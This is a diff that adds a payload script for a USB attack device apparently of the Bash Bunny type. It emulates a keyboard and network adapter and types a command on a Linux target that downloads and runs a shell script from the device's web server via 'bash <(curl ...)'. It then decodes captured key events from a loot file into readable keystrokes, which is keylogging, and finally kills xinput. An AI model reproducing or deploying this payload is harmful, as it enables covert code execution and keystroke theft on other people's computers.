@@ -1,0 +1,43 @@
+TARGET_OS='LINUX'
+
+LED B 100
+ATTACKMODE HID STORAGE ECM_ETHERNET
+sleep 3
+LED R SLOW
+GET HOST_IP
+GET SWITCH_POSITION
+udisk mount
+cd /root/udisk/payloads/$SWITCH_POSITION/
+python webserver.py &
+while true; do [[ $(curl $HOST_IP:8080/index.html) ]] && break ; done
+LED B FAST
+[[ $TARGET_OS == 'auto' ]] && GET TARGET_OS
+[[ $TARGET_OS == 'WINDOWS' ]] && RUN WIN add windows payload
+[[ $TARGET_OS == 'MACOS' ]] && RUN OSX add osx payload
+[[ $TARGET_OS == 'LINUX' ]] && RUN LINUX bash \-c \'bash \<\(curl http\:\/\/$HOST_IP\:8080\/Linux\.sh\)\' \&
+LED
+WAIT
+LED R 0
+cd /root/udisk/loot
+keystate=''
+_ctrl='0'
+_alt='0'
+_shift='0'
+for line in $(cat 'keys')
+do
+	if [ $line != 'key' ]; then
+		if [ $line == 'press' ] || [ $line == 'release' ]; then
+			keystate=$line
+		else
+			_spaces=$(printf '%*s' $((4-${#line})) | tr ' ' ' ')
+			searchparams='keycode'"$_spaces"$line
+			key=$(cat 'maps' | grep "$searchparams" | awk '{print $4}')
+			echo "Ctrl="$_ctrl" Alt="$_alt" Shift="$_shift"  "$keystate"  "$key >> 'decoded'
+			
+		fi
+	fi
+done
+[[ $TARGET_OS == 'WINDOWS' ]] && RUN WIN add windows payload
+[[ $TARGET_OS == 'MACOS' ]] && RUN OSX add osx payload
+[[ $TARGET_OS == 'LINUX' ]] && RUN LINUX killall xinput
+LED G 0
